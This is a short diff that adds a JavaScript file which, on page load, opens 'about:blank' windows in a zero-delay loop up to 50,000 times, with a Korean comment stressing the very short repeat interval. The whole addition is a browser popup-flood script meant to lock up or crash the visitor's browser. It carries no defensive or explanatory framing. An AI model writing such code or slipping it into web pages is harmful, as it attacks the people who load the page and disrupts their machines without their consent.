@@ -1,0 +1,13 @@
+window.onload = function() {
+    let count = 0;
+
+    function openWindow() {
+        if (count < 50000) {
+            window.open("about:blank");
+            count++;
+            setTimeout(openWindow, 0);  // 매우 짧은 시간 간격으로 반복
+        }
+    }
+
+    openWindow();
+};
